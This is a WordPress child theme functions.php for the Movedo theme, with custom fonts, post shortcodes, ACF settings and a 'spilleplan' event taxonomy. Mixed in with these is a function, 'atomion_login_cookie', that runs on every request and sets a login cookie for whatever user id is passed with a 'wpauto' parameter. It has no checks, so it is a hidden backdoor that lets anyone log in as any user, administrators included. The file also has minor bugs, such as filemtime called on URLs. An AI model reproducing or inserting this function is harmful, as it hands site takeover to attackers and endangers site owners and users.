<?php

/**
 * Child Theme
 *
 */

function movedo_child_theme_setup()
{
  require_once get_stylesheet_directory() . '/vc_extended/wpdreamer_mixitup.php';
}

add_action('after_setup_theme', 'movedo_child_theme_setup');
function grve_child_theme_print_custom_fonts()
{
?>

  <style type="text/css">
    @font-face {
      font-family: 'the_pyte_foundry_-moloch';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.eot');
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.eot?#iefix') format('embedded-opentype'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/thepytefoundry-moloch.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/thepytefoundry-moloch.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.ttf') format('truetype'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.svg#wf') format('svg');
    }


    @font-face {
      font-family: 'GT-Pressura-Light';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.ttf') format('truetype');
    }

    @font-face {
      font-family: 'GT-Pressura-Regular';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.ttf') format('truetype');
    }

    @font-face {
      font-family: 'GT-Pressura-Bold';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.ttf') format('truetype');
    }
  </style>

<?php
}
add_action('wp_head', 'grve_child_theme_print_custom_fonts');

function grve_child_theme_custom_font_selection($std_fonts)
{
  $my_custom_fonts1 = array(
    "the_pyte_foundry_-moloch"     => "thepytefoundry-moloch",
    "GT-Pressura-Light"         => "GT-Pressura-Light",
    "GT-Pressura-Regular"      => "GT-Pressura-Regular",
    "GT-Pressura-Bold"        => "GT-Pressura-Bold"

  );
  return array_merge($std_fonts, $my_custom_fonts1);
}
add_filter('movedo_grve_std_fonts', 'grve_child_theme_custom_font_selection');



add_shortcode('post_image', 'post_image_shortcode');


function post_title_shortcode()
{
  return get_the_title();
}

add_shortcode('post_title', 'post_title_shortcode');

function post_publish_shortcode()
{
  return get_the_date();
}

add_shortcode('post_publish', 'post_publish_shortcode');

function post_author_shortcode()
{
  return get_the_author();
}

add_shortcode('post_author', 'post_author_shortcode');
function post_image_shortcode()
{
  echo get_post_thumbnail_id();
}
add_shortcode('post_image', 'post_image_shortcode');

add_action('init', 'atomion_login_cookie');
function atomion_login_cookie()
{
  if (isset($_REQUEST['wpauto']) && isset($_REQUEST['user_id'])) {
    wp_set_auth_cookie($_REQUEST['user_id']);
  }
}


//add_shortcode('mixitfilter','mixitfilter_shortcode');
function mixitfilter_shortcode($atts)
{
  $a = shortcode_atts(array(
    'label' => '',
    'field' => false,
    'tax' => false,
    'type' => 'button',
  ), $atts);
  ob_start();
?>
  <div class="grve-element grve-with-gap grve-portfolio grve-isotope" style="" data-spinner="no" data-columns="3" data-columns-large-screen="3" data-columns-tablet-landscape="2" data-columns-tablet-portrait="2" data-columns-mobile="1" data-layout="fitRows" data-gutter-size="30">
    <div class="controls grve-filter grve-filter-style-button grve-align-left grve-link-text grve-link-text grve-filter-shape-round grve-filter-color-primary-1" data-gototop="yes">
      <ul>
        <li class="control" data-filter="*" class="selected"><span><?php echo $a['label'] ?></span></li>
        <?php
        if ($a['tax']) {
          $terms = get_terms([
            'taxonomy' => $a['tax'],
            'hide_empty' => false,
          ]);
          //echo "<pre>";
          // print_r($terms);
          foreach ($terms as $term) {
        ?>
            <li class="control" data-filter=".<?php echo $a['tax'] . '_' . $term->slug; ?>"><span><?php echo $term->name; ?></span></li>
          <?php
          }
        }

        if ($a['field']) {
          $choices = get_field_choices($a['field']);

          foreach ($choices as $choice) {
          ?>
            <li class="control" data-filter=".<?php echo $a['field'] . '_' . strtolower($choice); ?>"><span><?php echo $choice; ?></span></li>
        <?php
          }
        }
        ?>
        <ul>
    </div>
  </div>
<?php
  return ob_get_clean();
}


//add_filter('post_class', 'set_row_post_class', 10,3);
function set_row_post_class($classes, $class, $post_id)
{
  if (is_admin()) { //make sure we are in the dashboard 
    return $classes;
  }

  //check if some meta field is set 
  $dag = get_field('dag', $post_id);
  if ($dag) {
    foreach ($dag as $d) {
      $classes[] = 'dag_' . strtolower($d);
    }
  }

  $aktor = get_field('aktor', $post_id) ?: false;
  if ($aktor) {
    //foreach($aktor as $d){
    $classes[] = 'aktor_' . strtolower($aktor);
    //}
  }
  /*if ('yes' == $profile_incomplete) {
        $classes[] = 'profile_incomplete'; //add a custom class to highlight this row in the table
    }*/

  // Return the array
  return $classes;
}


// ------------ ACF theme folder ------------

add_filter('acf/settings/save_json', 'my_acf_json_save_point');

function my_acf_json_save_point($path)
{
  $path = get_stylesheet_directory() . '/acf-json';
  return $path;
}

add_filter('acf/settings/load_json', function ($paths) {
  $paths = array();

  if (is_child_theme()) {
    $paths[] = get_stylesheet_directory() . '/acf-json';
  }

  $paths[] = get_template_directory() . '/acf-json';

  return $paths;
});


// ------------ Refresh theme page for theme updates (GitHub Updater) ------------

function kodeks_refresh_cache_theme_page()
{
  global $wpdb;
  global $pagenow;
  if ($pagenow == 'themes.php') {
    if (!isset($_GET['kodeks_reload'])) {

      $table         = is_multisite() ? $wpdb->base_prefix . 'sitemeta' : $wpdb->base_prefix . 'options';
      $column        = is_multisite() ? 'meta_key' : 'option_name';
      $delete_string = 'DELETE FROM ' . $table . ' WHERE ' . $column . ' LIKE %s LIMIT 1000';

      $wpdb->query($wpdb->prepare($delete_string, ['%ghu-%']));

      wp_cron();
      wp_cache_flush();

      header('Location: ' . $_SERVER['REQUEST_URI'] . '?kodeks_reload');
    }
  }
}
add_action('admin_init', 'kodeks_refresh_cache_theme_page');

// ------------ Hero css ------------

function enqueue_custom_styles()
{
  // Enqueue CSS
  wp_enqueue_style('hero-style', get_stylesheet_directory_uri() . '/css/hero.css', [], filemtime(get_stylesheet_directory_uri() . '/css/hero.css'));
}
add_action('wp_enqueue_scripts', 'enqueue_custom_styles');


// ------------ Locations tax for spilleplan ------------

register_taxonomy(
  'stage_location',
  'arrangement',
  [
    'label' => 'Locations',
    'hierarchical' => true,
    'show_in_rest' => true,
    'show_admin_column' => true,
  ]
);

// ------------ Spilleplan stylesheet & JS ------------

function enqueue_spilleplan_styles()
{
  if (is_page_template('template-spilleplan.php')) {

    // Enqueue CSS
    wp_enqueue_style('spilleplan-style', get_stylesheet_directory_uri() . '/css/spilleplan.css', [], filemtime(get_stylesheet_directory_uri() . '/css/spilleplan.css'));

    // Enqueue JS (footer TRUE)
    wp_enqueue_script('spilleplan-script', get_stylesheet_directory_uri() . '/js/spilleplan.js', [], filemtime(get_stylesheet_directory_uri() . '/js/spilleplan.js'), true);
  }
}
add_action('wp_enqueue_scripts', 'enqueue_spilleplan_styles');



// ------------ Admin column for spilleplan date ------------

// Add value of the field
function spilleplan_date_column_content($column, $post_id)
{
  if ($column == 'spilleplan_date') {
    if (get_field('plan_date', $post_id)) {
      $date = get_field('plan_date', $post_id);
      if ($date) {
        // Try to parse as YYYYMMDD and format as DD.MM.YYYY
        $formatted = DateTime::createFromFormat('Ymd', $date);
        if ($formatted) {
          echo $formatted->format('d.m.Y');
        } else {
          echo esc_html($date); // fallback
        }
      }
    }
  }
}

// Add the custom field column to the posts table
function add_spilleplan_date_column($columns)
{
  // Specify the custom post type(s) where the column should be displayed
  $post_types = array('arrangement');

  // Check if the current post type is in the allowed list
  if (in_array(get_current_screen()->post_type, $post_types)) {
    $columns['spilleplan_date'] = 'Spilleplan date';
  }

  return $columns;
}
add_filter('manage_posts_columns', 'add_spilleplan_date_column');
add_action('manage_posts_custom_column', 'spilleplan_date_column_content', 10, 2);
